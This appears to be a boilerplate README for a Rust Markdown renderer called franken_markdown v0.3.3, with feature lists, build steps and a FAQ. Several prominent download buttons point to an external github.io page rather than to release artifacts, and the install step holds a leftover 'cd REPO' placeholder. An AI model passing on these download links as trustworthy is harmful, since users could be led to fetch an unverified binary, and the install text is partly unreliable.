# franken_markdown v0.3.3 - Markdown renderer 2026

> **franken_markdown is a Rust-based Markdown renderer for HTML, PDF, and browser workflows, with deterministic output in version 0.3.3.**

[![Platform](https://img.shields.io/badge/Platform-Rust-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.3.3-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/caleb-hayes/franken-markdown-v033?style=flat-square)](https://github.com/caleb-hayes/franken-markdown-v033)

---

<p align="center">
  <a href="https://caleb-hayes.github.io/franken-markdown-v033/">
    <img src="https://img.shields.io/badge/Download-franken_markdown%20Latest-brightgreen?style=for-the-badge" alt="Download franken_markdown">
  </a>
</p>

> **[Direct Download - franken_markdown v0.3.3](https://caleb-hayes.github.io/franken-markdown-v033/)**

---

[Download Latest Build](https://caleb-hayes.github.io/franken-markdown-v033/)

---

## Overview

franken_markdown is a Markdown rendering toolkit written in Rust for converting source content into polished HTML and streamlined PDF output. It is built to work as both a reusable library and a command-line application, and it also extends into browser and WASM environments.

This project is a strong fit when you need repeatable rendering, a lightweight runtime, and consistent output from one run to the next. With support for syntax highlighting, tables, and diagrams, it works well in documentation pipelines, static site generation, and other Markdown-to-artifact workflows.

---

## What it includes

- Pure-Rust core with a clean-room implementation approach
- Self-contained HTML output for standalone rendering
- Compact tagged PDF generation for optimized documents
- Single-binary CLI experience through `fmd`
- Browser and WASM support for web-based integration
- Syntax highlighting for code-heavy Markdown
- Table and diagram rendering support
- Deterministic output for repeatable builds and comparisons

---

## Installation

To build the CLI from source, clone the repository and compile it locally:

```bash
git clone https://github.com/caleb-hayes/franken-markdown-v033.git
cd REPO
cargo build --release
```

Once the build completes, run the `fmd` executable from the release target directory, or link the library directly into your Rust project.

---

## Usage

You can render Markdown files to HTML or PDF with the CLI, or embed the library in Rust code when the renderer needs to live inside another application.

Typical CLI workflow:

```bash
fmd input.md -o output.html
fmd input.md -o output.pdf
```

For browser or WASM use, build for the desired target and wire the renderer into your application flow. The same core logic can serve command-line, library, and web-based setups.

---

## Configuration

franken_markdown is configured mainly through CLI parameters or library settings, depending on the integration style you choose.

Example of a simple render setup:

```toml
[render]
format = "html"
highlight = true
deterministic = true
```

When using the binary, keep preferred flags in shell aliases, scripts, or wrapper commands. When using the library, manage rendering behavior through the Rust API layer of your application.

---

## Requirements

- Rust toolchain for building from source
- A supported target for the CLI, library, or WASM build
- Enough storage for compiled artifacts and generated HTML or PDF files
- A compatible environment for any font, browser, or document workflow you connect to the renderer

---

## FAQ

**How do I get updates?**  
Grab the newest tagged release, or rebuild from current source if you need the latest changes.

**Where do settings live?**  
Configuration comes from CLI flags, build-time choices, or the library integration inside your application.

**What if rendering looks different than expected?**  
Review the input Markdown, enabled features, and output target. Deterministic rendering reduces variation, but format-specific options can still affect results.

**Can I use it in a browser project?**  
Yes, browser and WASM support are included in the project scope.

**Is this only a CLI tool?**  
No. It is available as both a library and a single-binary CLI named `fmd`.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
